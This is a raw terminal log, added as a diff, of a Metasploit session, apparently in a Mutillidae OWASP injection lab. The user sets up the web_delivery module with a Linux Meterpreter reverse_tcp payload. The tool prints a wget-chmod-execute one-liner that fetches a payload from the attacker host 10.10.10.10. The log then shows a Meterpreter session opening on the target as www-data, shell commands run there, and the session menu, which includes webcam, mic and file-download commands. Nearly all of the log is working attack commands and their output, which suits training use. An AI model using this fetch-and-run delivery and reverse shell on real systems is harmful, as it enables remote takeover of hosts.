@@ -1,0 +1,504 @@
+Script started on 2020-09-04 21:10:49+05:30 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/DNS_Lookup[01;31mdinesh@evil[00m: [[01;34mDNS_Lookup[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/DNS_Lookup[01;31mdinesh@evil[00m: [[01;34mDNS_Lookup[00m] $ msfconsole -q 
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> search dev[Klivert
+[0m[1m[31m[-][0m No results from search
+[4mmsf5[0m [0m> search delivert[Ky
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/client/smtp/emailer                                                normal     No     Generic Emailer (SMTP)
+   1   auxiliary/server/regsvr32_command_[45mdelivery[0m_server                            normal     No     Regsvr32.exe (.sct) Command [45mDelivery[0m Server
+   2   exploit/linux/http/citrix_dir_traversal_rce                 2019-12-17       [32mexcellent[0m  Yes    Citrix ADC (NetScaler) Directory Traversal RCE
+   3   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   4   exploit/multi/script/web_[45mdelivery[0m                           2013-07-19       manual     No     Script Web [45mDelivery[0m
+   5   exploit/windows/fileformat/irfanview_jpeg2000_bof           2012-01-16       normal     No     Irfanview JPEG2000 jp2 Stack Buffer Overflow
+   6   exploit/windows/fileformat/office_dde_[45mdelivery[0m              2017-10-09       manual     No     Microsoft Office DDE Payload [45mDelivery[0m
+   7   exploit/windows/fileformat/office_excel_slk                 2018-10-07       manual     No     Microsoft Excel .SLK Payload [45mDelivery[0m
+   8   exploit/windows/misc/ais_esel_server_rce                    2019-03-27       [32mexcellent[0m  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   9   exploit/windows/misc/webdav_[45mdelivery[0m                        1999-01-01       manual     No     Serve DLL via webdav server
+   10  exploit/windows/mssql/mssql_payload                         2000-05-30       [32mexcellent[0m  Yes    Microsoft SQL Server Payload Execution
+   11  exploit/windows/mssql/mssql_payload_sqli                    2000-05-30       [32mexcellent[0m  No     Microsoft SQL Server Payload Execution via SQL Injection
+   12  exploit/windows/smb/smb_[45mdelivery[0m                            2016-07-26       [32mexcellent[0m  No     SMB [45mDelivery[0m
+   13  exploit/windows/winrm/winrm_script_exec                     2012-11-01       manual     No     WinRM Script Exec Remote Code Execution
+
+
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use exploit/multi/script/web_delivery
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Pa
+set PaYLOAD                    set PayloadProcessCommandLine  set PayloadUUIDRaw             set PayloadUUIDTracking
+set Payload                    set PayloadUUIDName            set PayloadUUIDSeed            
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Pay[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Pay
+set PayLOAD                    set PayloadProcessCommandLine  set PayloadUUIDRaw             set PayloadUUIDTracking
+set Payload                    set PayloadUUIDName            set PayloadUUIDSeed            
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Payl
+set PaylOAD                    set PayloadProcessCommandLine  set PayloadUUIDRaw             set PayloadUUIDTracking
+set Payload                    set PayloadUUIDName            set PayloadUUIDSeed            
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Paylo
+set PayloAD                    set PayloadProcessCommandLine  set PayloadUUIDRaw             set PayloadUUIDTracking
+set Payload                    set PayloadUUIDName            set PayloadUUIDSeed            
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set Paylo[K[K[K[KAYLoad
+set PAYLoad                    set PAYLoadUUIDName            set PAYLoadUUIDSeed            
+set PAYLoadProcessCommandLine  set PAYLoadUUIDRaw             set PAYLoadUUIDTracking        
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set PAYLoad
+set PAYLoad                    set PAYLoadUUIDName            set PAYLoadUUIDSeed            
+set PAYLoadProcessCommandLine  set PAYLoadUUIDRaw             set PAYLoadUUIDTracking        
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set PAYLoad 
+set PAYLoad generic/custom                       set PAYLoad python/meterpreter/reverse_tcp_uuid
+set PAYLoad generic/shell_bind_tcp               set PAYLoad python/meterpreter_bind_tcp
+set PAYLoad generic/shell_reverse_tcp            set PAYLoad python/meterpreter_reverse_http
+set PAYLoad multi/meterpreter/reverse_http       set PAYLoad python/meterpreter_reverse_https
+set PAYLoad multi/meterpreter/reverse_https      set PAYLoad python/meterpreter_reverse_tcp
+set PAYLoad python/meterpreter/bind_tcp          set PAYLoad python/pingback_bind_tcp
+set PAYLoad python/meterpreter/bind_tcp_uuid     set PAYLoad python/pingback_reverse_tcp
+set PAYLoad python/meterpreter/reverse_http      set PAYLoad python/shell_bind_tcp
+set PAYLoad python/meterpreter/reverse_https     set PAYLoad python/shell_reverse_tcp
+set PAYLoad python/meterpreter/reverse_tcp       set PAYLoad python/shell_reverse_tcp_ssl
+set PAYLoad python/meterpreter/reverse_tcp_ssl   set PAYLoad python/shell_reverse_udp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set PAYLoad [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set PAYLoad 
+set PAYLoad generic/custom                       set PAYLoad python/meterpreter/reverse_tcp_uuid
+set PAYLoad generic/shell_bind_tcp               set PAYLoad python/meterpreter_bind_tcp
+set PAYLoad generic/shell_reverse_tcp            set PAYLoad python/meterpreter_reverse_http
+set PAYLoad multi/meterpreter/reverse_http       set PAYLoad python/meterpreter_reverse_https
+set PAYLoad multi/meterpreter/reverse_https      set PAYLoad python/meterpreter_reverse_tcp
+set PAYLoad python/meterpreter/bind_tcp          set PAYLoad python/pingback_bind_tcp
+set PAYLoad python/meterpreter/bind_tcp_uuid     set PAYLoad python/pingback_reverse_tcp
+set PAYLoad python/meterpreter/reverse_http      set PAYLoad python/shell_bind_tcp
+set PAYLoad python/meterpreter/reverse_https     set PAYLoad python/shell_reverse_tcp
+set PAYLoad python/meterpreter/reverse_tcp       set PAYLoad python/shell_reverse_tcp_ssl
+set PAYLoad python/meterpreter/reverse_tcp_ssl   set PAYLoad python/shell_reverse_udp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set PAYLoad lii[KnInterrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> ll
+[0m[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> shiio[K[K[Kow options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target [P[P[Ps target h target o target w target [C target 
+[0m[1m[31m[-][0m Invalid parameter "target", use "show -h" for more information
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target 
+set target 0              set target 4              set target Linux          set target PSH\ (Binary)  
+set target 1              set target 5              set target Mac\ OS\ X     set target Python         
+set target 2              set target 6              set target PHP            set target Regsvr32       
+set target 3              set target 7              set target PSH            set target pubprn         
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target Linux 
+[0mtarget => Linux
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload 
+set payload generic/custom                            set payload linux/x86/meterpreter/bind_tcp_uuid
+set payload generic/debug_trap                        set payload linux/x86/meterpreter/reverse_ipv6_tcp
+set payload generic/shell_bind_tcp                    set payload linux/x86/meterpreter/reverse_nonx_tcp
+set payload generic/shell_reverse_tcp                 set payload linux/x86/meterpreter/reverse_tcp
+set payload generic/tight_loop                        set payload linux/x86/meterpreter/reverse_tcp_uuid
+set payload linux/x64/exec                            set payload linux/x86/meterpreter_reverse_http
+set payload linux/x64/meterpreter/bind_tcp            set payload linux/x86/meterpreter_reverse_https
+set payload linux/x64/meterpreter/reverse_tcp         set payload linux/x86/meterpreter_reverse_tcp
+set payload linux/x64/meterpreter_reverse_http        set payload linux/x86/metsvc_bind_tcp
+set payload linux/x64/meterpreter_reverse_https       set payload linux/x86/metsvc_reverse_tcp
+set payload linux/x64/meterpreter_reverse_tcp         set payload linux/x86/read_file
+set payload linux/x64/pingback_bind_tcp               set payload linux/x86/shell/bind_ipv6_tcp
+set payload linux/x64/pingback_reverse_tcp            set payload linux/x86/shell/bind_ipv6_tcp_uuid
+set payload linux/x64/shell/bind_tcp                  set payload linux/x86/shell/bind_nonx_tcp
+set payload linux/x64/shell/reverse_tcp               set payload linux/x86/shell/bind_tcp
+set payload linux/x64/shell_bind_ipv6_tcp             set payload linux/x86/shell/bind_tcp_uuid
+set payload linux/x64/shell_bind_tcp                  set payload linux/x86/shell/reverse_ipv6_tcp
+set payload linux/x64/shell_bind_tcp_random_port      set payload linux/x86/shell/reverse_nonx_tcp
+set payload linux/x64/shell_reverse_ipv6_tcp          set payload linux/x86/shell/reverse_tcp
+set payload linux/x64/shell_reverse_tcp               set payload linux/x86/shell/reverse_tcp_uuid
+set payload linux/x86/chmod                           set payload linux/x86/shell_bind_ipv6_tcp
+set payload linux/x86/exec                            set payload linux/x86/shell_bind_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell_bind_tcp_random_port
+set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell_reverse_tcp_ipv6
+set payload linux/x86/meterpreter/bind_tcp            
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x
+set payload linux/x64/exec                            set payload linux/x86/meterpreter/reverse_nonx_tcp
+set payload linux/x64/meterpreter/bind_tcp            set payload linux/x86/meterpreter/reverse_tcp
+set payload linux/x64/meterpreter/reverse_tcp         set payload linux/x86/meterpreter/reverse_tcp_uuid
+set payload linux/x64/meterpreter_reverse_http        set payload linux/x86/meterpreter_reverse_http
+set payload linux/x64/meterpreter_reverse_https       set payload linux/x86/meterpreter_reverse_https
+set payload linux/x64/meterpreter_reverse_tcp         set payload linux/x86/meterpreter_reverse_tcp
+set payload linux/x64/pingback_bind_tcp               set payload linux/x86/metsvc_bind_tcp
+set payload linux/x64/pingback_reverse_tcp            set payload linux/x86/metsvc_reverse_tcp
+set payload linux/x64/shell/bind_tcp                  set payload linux/x86/read_file
+set payload linux/x64/shell/reverse_tcp               set payload linux/x86/shell/bind_ipv6_tcp
+set payload linux/x64/shell_bind_ipv6_tcp             set payload linux/x86/shell/bind_ipv6_tcp_uuid
+set payload linux/x64/shell_bind_tcp                  set payload linux/x86/shell/bind_nonx_tcp
+set payload linux/x64/shell_bind_tcp_random_port      set payload linux/x86/shell/bind_tcp
+set payload linux/x64/shell_reverse_ipv6_tcp          set payload linux/x86/shell/bind_tcp_uuid
+set payload linux/x64/shell_reverse_tcp               set payload linux/x86/shell/reverse_ipv6_tcp
+set payload linux/x86/chmod                           set payload linux/x86/shell/reverse_nonx_tcp
+set payload linux/x86/exec                            set payload linux/x86/shell/reverse_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/reverse_tcp_uuid
+set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell_bind_ipv6_tcp
+set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell_bind_tcp
+set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell_bind_tcp_random_port
+set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell_reverse_tcp_ipv6
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/shell/bind_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/shell/reverse_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/pingback_reverse_tcp        
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/meterpreter/reverse_tcp 
+[0mpayload => linux/x64/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [1m[34m[*][0m Using URL: http://0.0.0.0:8080/GRXtKeiTrL
+[1m[34m[*][0m Local IP: http://10.10.10.10:8080/GRXtKeiTrL
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+wget -qO b7FFii5l --no-check-certificate http://10.10.10.10:8080/GRXtKeiTrL; chmod +x b7FFii5l; ./b7FFii5l& disown
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m Sending stage (3012516 bytes) to 10.10.10.8
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.8:38674) at 2020-09-04 21:14:24 +0530
+[0m
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                       Connection
+  --  ----  ----                   -----------                                                       ----------
+  1         meterpreter x64/linux  no-user @ htblab (uid=33, gid=33, euid=33, egid=33) @ 10.10.10.8  10.10.10.10:4444 -> 10.10.10.8:38674 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell 
+[0mProcess 1755 created.
+Channel 1 created.
+
+
+
+ps
+    PID TTY          TIME CMD
+    726 ?        00:00:00 apache2
+    727 ?        00:00:00 apache2
+    728 ?        00:00:00 apache2
+    729 ?        00:00:00 apache2
+    731 ?        00:00:00 apache2
+   1346 ?        00:00:00 apache2
+   1353 ?        00:00:00 apache2
+   1355 ?        00:00:00 apache2
+   1356 ?        00:00:00 apache2
+   1368 ?        00:00:00 apache2
+   1369 ?        00:00:00 apache2
+   1743 ?        00:00:00 sh <defunct>
+   1752 ?        00:00:00 b7FFii5l
+   1755 ?        00:00:00 sh
+   1756 ?        00:00:00 ps
+whoami
+www-data
+^C
+Terminate channel 1? [y/N]  y
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Mic Commands
+====================
+
+    Command       Description
+    -------       -----------
+    listen        listen to a saved audio recording via audio player
+    mic_list      list all microphone interfaces
+    mic_start     start capturing an audio stream from the target mic
+    mic_stop      stop capturing audio
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+[4mmeterpreter[0m > Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > e[K[H[2J[4mmeterpreter[0m > sessions 
+[0mUsage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions -k 1
+[0m[1m[34m[*][0m Killing the following session(s): 1
+[1m[34m[*][0m Killing session 1
+[1m[34m[*][0m 10.10.10.8 - Meterpreter session 1 closed.
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [0m
+[1m[34m[*][0m Server stopped.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/mutillidae/OWASP_2017/A1-Injection_Other/Application_Log_Injection/DNS_Lookup[01;31mdinesh@evil[00m: [[01;34mDNS_Lookup[00m] $ exit
+
+Script done on 2020-09-04 21:16:45+05:30 [COMMAND_EXIT_CODE="0"]
